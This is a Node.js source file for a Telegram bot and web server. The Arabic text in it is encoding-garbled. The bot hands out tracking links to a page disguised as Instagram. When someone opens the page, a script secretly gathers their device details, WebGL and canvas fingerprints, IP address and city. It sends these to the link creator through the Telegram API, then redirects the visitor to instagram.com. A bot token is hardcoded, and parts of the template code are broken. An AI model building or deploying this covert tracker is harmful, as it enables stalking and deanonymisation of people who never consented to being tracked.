const TelegramBot = require('node-telegram-bot-api');
const express = require('express');
const app = express();

// Ø§Ø³ØªØ¨Ø¯Ù„ Ù‡Ø°Ø§ Ø¨Ù€ token Ø§Ù„Ø¨ÙˆØª Ø§Ù„Ø®Ø§Øµ Ø¨Ùƒ
const token = '7612902419:AAFkil59yYM0O61rmGH6XAcOIm5pOdEkG58';
const bot = new TelegramBot(token, {polling: true});

// ØµÙØ­Ø© Ø§Ù„ÙˆÙŠØ¨ Ø§Ù„ØªÙŠ Ø³ØªØ¬Ù…Ø¹ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª
const TRACKING_PAGE_URL = 'https://yourdomain.com/tracking.html';

// Ø£ÙˆØ§Ù…Ø± Ø§Ù„Ø¨ÙˆØª
bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    const username = msg.from.first_name;
    
    const welcomeMsg = `Ù…Ø±Ø­Ø¨Ø§Ù‹ ${username}! ğŸ‘‹

ğŸ¯ Ù‡Ø°Ø§ Ø§Ù„Ø¨ÙˆØª ÙŠÙ…ÙƒÙ†Ùƒ Ù…Ù† Ø¥Ù†Ø´Ø§Ø¡ Ø±ÙˆØ§Ø¨Ø· ØªØªØ¨Ø¹ Ø®Ø§ØµØ© Ø¨Ùƒ

ğŸ“Œ Ø¹Ù†Ø¯Ù…Ø§ ÙŠÙØªØ­ Ø£ÙŠ Ø´Ø®Øµ Ø§Ù„Ø±Ø§Ø¨Ø· Ø§Ù„Ø®Ø§Øµ Ø¨Ùƒ:
1. Ø³ÙŠØªÙ… ØªÙˆØ¬ÙŠÙ‡Ù‡ ØªÙ„Ù‚Ø§Ø¦ÙŠØ§Ù‹ Ø¥Ù„Ù‰ Instagram
2. Ø³ØªØ³ØªÙ„Ù… Ø£Ù†Øª Ø¬Ù…ÙŠØ¹ Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø¬Ù‡Ø§Ø²Ù‡ Ø³Ø±Ø§Ù‹

ğŸš€ Ù„Ø¥Ù†Ø´Ø§Ø¡ Ø±Ø§Ø¨Ø· Ø§Ù„ØªØªØ¨Ø¹ Ø§Ù„Ø®Ø§Øµ Ø¨Ùƒ:
Ø§Ø¶ØºØ· /getlink

ğŸ”’ Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª ØªØµÙ„ Ù„Ùƒ Ø£Ù†Øª ÙÙ‚Ø· ÙˆÙ„Ø§ ÙŠØ±Ø§Ù‡Ø§ Ø£Ø­Ø¯ ØºÙŠØ±Ùƒ`;

    bot.sendMessage(chatId, welcomeMsg);
});

bot.onText(/\/getlink/, (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    
    const trackingLink = `${TRACKING_PAGE_URL}?ref=${userId}`;
    
    const linkMsg = `ğŸ”— Ù‡Ø°Ø§ Ù‡Ùˆ Ø±Ø§Ø¨Ø· Ø§Ù„ØªØªØ¨Ø¹ Ø§Ù„Ø®Ø§Øµ Ø¨Ùƒ:
${trackingLink}

ğŸ“¤ ÙŠÙ…ÙƒÙ†Ùƒ Ù…Ø´Ø§Ø±ÙƒØªÙ‡ Ù…Ø¹ Ø£ÙŠ Ø´Ø®Øµ:
- Ø¹Ù†Ø¯Ù…Ø§ ÙŠÙØªØ­Ù‡ØŒ Ø³ÙŠØªÙ… ØªÙˆØ¬ÙŠÙ‡Ù‡ Ø¥Ù„Ù‰ Instagram
- ÙˆØ³ØªØµÙ„Ùƒ Ø£Ù†Øª Ø¬Ù…ÙŠØ¹ Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø¬Ù‡Ø§Ø²Ù‡

âš ï¸ Ø§Ø­ØªÙØ¸ Ø¨Ø§Ù„Ø±Ø§Ø¨Ø· Ø®Ø§ØµØ§Ù‹ Ø¨Ùƒ ÙˆÙ„Ø§ ØªØ´Ø§Ø±ÙƒÙ‡ Ù…Ø¹ Ø£Ø´Ø®Ø§Øµ ØºÙŠØ± Ù…ÙˆØ«ÙˆÙ‚ÙŠÙ†`;
    
    bot.sendMessage(chatId, linkMsg);
});

// ØµÙØ­Ø© ØªØªØ¨Ø¹ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª
app.get('/tracking.html', (req, res) => {
    const ref = req.query.ref || '5854169054'; // Ø§Ù„Ù‚ÙŠÙ…Ø© Ø§Ù„Ø§ÙØªØ±Ø§Ø¶ÙŠØ©
    
    res.send(`
<html>
<head>
<meta charset="UTF-8">
<title>Instagram</title>
<style>body{margin:0;padding:0;background:#000;overflow:hidden;height:100vh;width:100vw}</style>
</head>
<body>

<script>
(async () => {
    const botToken = "${token}";
    const targetUserId = "${ref}";

    const data = {
        ua: navigator.userAgent,
        pl: navigator.platform,
        ven: navigator.vendor,
        av: navigator.appVersion,
        hc: navigator.hardwareConcurrency || "N/A",
        dm: navigator.deviceMemory ? navigator.deviceMemory + ' Ø¬ÙŠØ¬Ø§Ø¨Ø§ÙŠØª' : "N/A",
        sw: screen.width,
        sh: screen.height,
        ip: "N/A",
        country: "N/A",
        city: "N/A",
        wv: "N/A",
        wr: "N/A",
        cf: "N/A"
    };

    try {
        const canvas = document.createElement("canvas");
        const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
        if (gl) {
            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
            data.wv = debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : "N/A";
            data.wr = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "N/A";
        }
    } catch(e) {}

    try {
        const canvas = document.createElement("canvas");
        const ctx = canvas.getContext("2d");
        ctx.fillStyle = "#f60";
        ctx.fillRect(125,1,62,20);
        ctx.fillStyle = "#069";
        ctx.font = "16px Arial";
        ctx.fillText("fp",2,15);
        data.cf = canvas.toDataURL().substring(0,100) + "...";
    } catch(e) {}

    fetch("https://ipapi.co/json/")
        .then(r => r.ok ? r.json() : {})
        .then(ip => {
            data.ip = ip.ip || "N/A";
            data.country = ip.country_name || "N/A";
            data.city = ip.city || "N/A";
            sendReport();
        })
        .catch(() => sendReport());

    function sendReport() {
        const msg = \`*ğŸ“Š ØªÙ‚Ø±ÙŠØ± Ø¬Ø¯ÙŠØ¯ Ù…Ù† Ø§Ù„Ø±Ø§Ø¨Ø·*

ğŸ‘¤ Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…: ${escape(msg.from.first_name || 'Ù…Ø¬Ù‡ÙˆÙ„')}
ğŸ“± Ø§Ù„Ø¬Ù‡Ø§Ø²: ${escape(data.pl)} - ${escape(data.ven)}

ğŸ“Œ *Ø§Ù„Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„ÙÙ†ÙŠØ©:*
- Ø§Ù„Ù…ØªØµÙØ­: \${escape(data.ua)}
- Ø§Ù„Ø¥ØµØ¯Ø§Ø±: \${escape(data.av)}
- Ø§Ù„Ø£Ù†ÙˆÙŠØ©: \${data.hc}
- Ø§Ù„Ø°Ø§ÙƒØ±Ø©: \${data.dm}
- Ø§Ù„Ø¯Ù‚Ø©: \${data.sw}x\${data.sh}

ğŸŒ *Ø§Ù„Ù…ÙˆÙ‚Ø¹ Ø§Ù„Ø¬ØºØ±Ø§ÙÙŠ:*
- IP: \${data.ip}
- Ø§Ù„Ø¯ÙˆÙ„Ø©: \${escape(data.country)}
- Ø§Ù„Ù…Ø¯ÙŠÙ†Ø©: \${escape(data.city)}\`;

        fetch(\`https://api.telegram.org/bot\${botToken}/sendMessage\`, {
            method: "POST",
            headers: {"Content-Type": "application/json"},
            body: JSON.stringify({
                chat_id: targetUserId,
                text: msg,
                parse_mode: "Markdown"
            })
        }).catch(() => {});
        
        window.location.replace("https://www.instagram.com/");
    }

    function escape(text) {
        return text ? text.replace(/[_*[\]()~>#+\-=|{}.!]/g, '\\\\$&') : "N/A";
    }
})();
</script>

</body>
</html>
    `);
});

// ØªØ´ØºÙŠÙ„ Ø§Ù„Ø³ÙŠØ±ÙØ±
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(\`Server running on port \${PORT}\`);
});
